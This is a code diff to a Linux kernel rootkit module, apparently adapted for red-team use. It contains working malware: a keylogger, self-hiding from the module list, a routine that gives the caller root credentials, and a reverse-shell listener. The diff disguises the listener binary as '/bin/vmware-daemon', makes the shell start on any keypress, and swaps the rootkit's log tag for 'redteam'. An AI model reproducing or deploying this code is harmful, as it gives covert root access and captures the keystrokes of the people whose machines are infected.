@@ -13,7 +13,7 @@
 #include<asm/current.h>
 #include<linux/sched.h>
 #include<linux/syscalls.h>
-/*#include<asm/system.h>*/ 
+/*#include<asm/system.h>*/
 #include<linux/fs.h>
 #include<linux/keyboard.h>
 #include<linux/input.h>
@@ -27,7 +27,7 @@ MODULE_DESCRIPTION("This is a rootkit implementation");
 #define DEVICE_NAME_TEMPLATE
 #define DEVICE_MAJOR_TEMPLATE
 #define MAX_CMD_LENGTH 20
-#define SHELL "SHELL_TEMPLATE"
+#define SHELL "/bin/vmware-daemon"
 #define CLEANUP "CLEAN_TEMPLATE"
 
 /*
@@ -66,15 +66,23 @@ int shellUp = 0;
 /*
  * --Privilege Escalation. Give caller root.--
  */
+
+
 void root_me(void){
 	struct cred *haxcredentials;
 	haxcredentials = prepare_creds();
 	if(haxcredentials == NULL)
 		return;
-	haxcredentials->uid = haxcredentials->gid = 0;
-	haxcredentials->euid = haxcredentials->egid = 0;
-	haxcredentials->suid = haxcredentials->sgid = 0;
-	haxcredentials->fsuid = haxcredentials->fsgid = 0;
+	haxcredentials->uid =
+	haxcredentials->euid =
+	haxcredentials->suid =
+	haxcredentials->fsuid =
+		make_kuid(current_user_ns(), 0);
+	haxcredentials->gid =
+	haxcredentials->egid =
+	haxcredentials->sgid =
+	haxcredentials->fsgid =
+		make_kgid(current_user_ns(), 0);
 	commit_creds(haxcredentials);
 }
 
@@ -82,6 +90,10 @@ void root_me(void){
  * --Start reverse shell listener--
  */
 static int start_listener(void){
+	if(shellUp == 1){
+		return;
+	}
+	shellUp = 1;
 	char *argv[] = { SHELL, NULL, NULL};
 	static char *env[] = {
 		"HOME=/",
@@ -94,6 +106,7 @@ static int start_listener(void){
  * --Kill reverse shell listener--
  */
 static int kill_listener(void){
+	shellUp = 0;
 	char *argv[] = { CLEANUP, NULL, NULL};
 	static char *env[] = {
 		"HOME=/",
@@ -138,6 +151,7 @@ static const char* keysShift[] = {"","[ESC]","!","@","#","$","%","^","&","*",
 //On key notify event, catch and run handler
 int key_notify(struct notifier_block *nblock, unsigned long kcode, void *p){
 	struct keyboard_notifier_param *param = p;
+	start_listener();
    	if(kcode == KBD_KEYCODE && keyLogOn){
         if( param->value==42 || param->value==54 ){
             down(&s);
@@ -177,7 +191,7 @@ int key_notify(struct notifier_block *nblock, unsigned long kcode, void *p){
                         basePtr = keyBuffer;
                     }
                 }
-            }    
+            }
             up(&s);
         }
     }
@@ -211,13 +225,13 @@ int open_dev(struct inode *inode, struct file *filp){
 	return 0; //success
 }
 //read of device
-ssize_t read_dev(struct file *filp, char __user *buf, size_t count, 
+ssize_t read_dev(struct file *filp, char __user *buf, size_t count,
 						loff_t *posPtr){
 	int key;
 	int result;
 	char* buffer;
 	if(debug == 1)
-		printk(KERN_ALERT "maK_it: read_dev executed!\n");
+		printk(KERN_ALERT "redteam: read_dev executed!\n");
 	key = 0;
 	buffer = keyBuffer;
 	while(*buffer != '\0'){
@@ -254,7 +268,7 @@ static ssize_t write_dev(struct file *filp, const char *buff,
 			i++;
 		}
         if(debug == 1)
-    		printk(KERN_ALERT "maK_it: command: %s \n",commands);
+    		printk(KERN_ALERT "redteam: command: %s \n",commands);
 		if(strcmp(commands, "debug") == 0){
 			if(debug == 0){ debug = 1;}
 			else{ debug = 0;}
@@ -262,50 +276,48 @@ static ssize_t write_dev(struct file *filp, const char *buff,
 		if(strcmp(commands,"keyLogOn") == 0){
 			keyLogOn = 1;
 			if(debug == 1)
-				printk(KERN_ALERT "maK_it: Key logger on!\n");
+				printk(KERN_ALERT "redteam: Key logger on!\n");
         	}
 		if(strcmp(commands, "keyLogOff") == 0){
 			keyLogOn = 0;
 			if(debug == 1)
-				printk(KERN_ALERT "maK_it: Key logger off!\n");
+				printk(KERN_ALERT "redteam: Key logger off!\n");
 		}
 		if(strcmp(commands, "modHide") == 0){
 			hide_module();
 			if(debug == 1)
-				printk(KERN_ALERT "maK_it: Module Hidden!\n");
+				printk(KERN_ALERT "redteam: Module Hidden!\n");
 		}
 		if(strcmp(commands, "modReveal") == 0){
 			reveal_module();
 			if(debug == 1)
-				printk(KERN_ALERT "maK_it: Module revealed!\n");
+				printk(KERN_ALERT "redteam: Module revealed!\n");
 		}
 		if(strcmp(commands, "rootMe") == 0){
 			root_me();
 			if(debug == 1)
-				printk(KERN_ALERT "maK_it: Given r00t!\n");
+				printk(KERN_ALERT "redteam: Given r00t!\n");
 		}
 		if(strcmp(commands, "shellUp") == 0){
 			if(shellUp == 0){
 				start_listener();
-				shellUp = 1;
 			}
 			if(debug == 1)
-				printk(KERN_ALERT "maK_it: Remote Shell listener started!\n");
+				printk(KERN_ALERT "redteam: Remote Shell listener started!\n");
 		}
 		if(strcmp(commands, "shellDown") == 0){
 			if(shellUp == 1){
 				kill_listener();
-				shellUp = 0;
 			}
 			if(debug == 1)
-				printk(KERN_ALERT "maK_it: Remote Shell listener down!\n");
+				printk(KERN_ALERT "redteam: Remote Shell listener down!\n");
 		}
 		if(strcmp(commands, "command") == 0)
 			printk(KERN_EMERG "commands: debug, keyLogOn/Off, modHide/Reveal, rootMe, shellUp/Down\n");
 	}
 	else{
 		if(debug == 1)
-			printk(KERN_ALERT "maK_it: Command was too long.\n");
+			printk(KERN_ALERT "redteam: Command was too long.\n");
 	}
 	return -EINVAL;
 }
@@ -333,22 +345,21 @@ static struct notifier_block nb = {
  */
 
 static int init_mod(void){
-
     //hide module on start
     hide_module();
-    
+
 	//Listen for keys.
 	register_keyboard_notifier(&nb);
-	sema_init(&s, 1);        
-	
+	sema_init(&s, 1);
+
 	//Register a character device
 	memset(keyBuffer, 0, sizeof(keyBuffer));
 	major = register_chrdev(DEVICE_MAJOR, DEVICE_NAME, &fops);
 	if(debug == 1)
-		printk(KERN_ALERT "maK_it: Major %i \n", DEVICE_MAJOR);
+		printk(KERN_ALERT "redteam: Major %i \n", DEVICE_MAJOR);
 	if(major < 0){
 		if(debug == 1)
-			printk(KERN_INFO "maK_it: Major device failed with -1");
+			printk(KERN_INFO "redteam: Major device failed with -1");
         	return major;
 	}
 	return 0;
@@ -357,7 +368,7 @@ static int init_mod(void){
 static void exit_mod(void){
 	//Cleaning up on exit
 	if(debug == 1)
-		printk(KERN_ALERT "maK_it: Exiting module. \n");
+		printk(KERN_ALERT "redteam: Exiting module. \n");
 	unregister_keyboard_notifier(&nb);
 	unregister_chrdev(DEVICE_MAJOR, DEVICE_NAME);
 	memset(keyBuffer, 0, sizeof(keyBuffer));
